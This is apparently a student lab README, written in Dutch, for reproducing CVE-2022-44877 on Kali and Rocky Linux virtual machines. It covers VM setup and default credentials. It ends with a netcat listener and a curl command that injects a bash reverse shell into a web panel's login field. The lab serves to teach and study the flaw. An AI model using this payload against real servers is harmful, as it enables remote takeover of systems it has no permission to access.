# Repo For NPE Cybersecurity Assignment

# Handleiding CVE-2022-44877

## Installeren VDI

Voordat je deze scripts uitvoert en u wilt geen foutmeldingen, download de VDI eerst.

### VDI Kali

Klik op deze [link](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-virtualbox-amd64.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u juist upzippen. Hierna ga je in de geünzipte folder gaan en dan het .VDI bestand verplaatsen naar [VDI-folder](../src/VDI-folder/) in onze repo. Deze folder moet u nog aanmaken. Maak deze folder aan onder het mapje `src` (neem de naam letterlijk over, anders zal het script niet werken). Als u dit hebt gedaan, navigeert u naar onze GitHub repo (lokaal opgeslagen) en voert u het commando `tree` uit. Indien u dezelfde output krijgt als hieronder, is de folder correct aangemaakt.

```bash
C:.
└───src
    ├───Provisioning
    └───VDI-folder
```

### VDI Rokcy 8

Klik op deze [link](https://techloudgeek.com/download/image/?link=https://dlconusc1.linuxvmimages.com/046389e06777452db2ccf9a32efa3760:dldatac/VirtualBox/R/rockylinux/8/RockyLinux_8.5_VBM.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u juist upzippen. Hierna ga je in de geünzipte folder gaan en dan het .VDI bestand verplaatsen naar [onze VDI folder](./src/VDI-folder/) in onze repo.

### Configuratie host-only adapter

We hebben een host-only adapter nodig voor onze opstelling. Om deze toe te voegen, opent u `VirtualBox`, gaat u naar de netwerk instellingen (linker balk 5de icoontje van boven te tellen). Klik op `aanmaken`. Nu gaan we onze adapter instellen volgens onze opstelling. Selecteer bij de tab `adapter` het bolletje `Handmatig adapter instellen`. Hier zetten we `IP-adres` op 192.168.100.1 en de `subnetmask` op 255.255.255.0. Dan gaan we naar de tab `DHCP-server`. Hier gaan we enkel `laatste-adres` aanpassen naar 192.168.100.100.

## Opzetten Virtuele Machines

Open een powershell venster waar je onze [GitHub repo](https://github.com/NickyCobbaert/Cybersecurity_NPE_Ni_Ru) hebt opgeslagen. Dan moet je naar onze [src-folder](./src/). Dit doe je in powershell met volgend commando `cd .\src\`. Nu zit u in onze folder van al onze scripts. Vanaf hier is het erg eenvoudig om alle scripts uit te voeren.

Voor je de commando's uitvoert, zorg ervoor dat je PowerShell versie **7** op je computer hebt staan. Je kan gewoon je terminal openen zoals hierboven is beschreven, maar dan moet u enkel nog volgend commando uitvoeren `pwsh`. Dan zou je normaal volgend scherm moeten te zien krijgen.

```powershell
PS C:\Cybersecurity_NPE_Ni_Ru\src> pwsh
PowerShell 7.5.5

   A new PowerShell stable release is available: v7.6.1
   Upgrade now, or check out the release page at:
     https://aka.ms/PowerShell-Release?tag=v7.6.1
```

### Opzet Kali

Voer volgend commando uit in jouw powershell scherm:

```bash
& '.\Kali Linux.ps1'
```

#### Credentials

username=kali

password=kali

### Opzet Rocky

Voordat je het scipt uitvoer, kijk eerst eens in uw `known hosts`. Als daar nog een regel staat met `127.0.0.1` of `localhost`, dan moet je deze verwijderen.

Voer volgend commando uit in jouw powershell scherm:

```bash
.\Debian_NPE_N-R_init.ps1
```

**Opgepast:**

We hebben ons script zo gemaakt, dat u als gebruiker moet u `enter` doen als de AlmaLinux VM is opgestart. Je kan dit zien, als je de username & password moet ingeven. Je geeft deze in (credentials zie hieronder) en druk dan in je powershell venster op `enter`.

#### Credentials

username=rockylinux

password=rockylinux

# Hoe CVE-2022-44877 uitvoeren

## Open listener op Kali

```bash
nc -lvnp 4444
```

## Exploit uitvoeren vanaf Kali

- Surf naar de website van de RockyLinux en stuur alle output naar onze listener op Kali

```bash
curl -d "login=admin\" ; bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1 ; #" http://$IP_ROCKY$/login/index.php
```
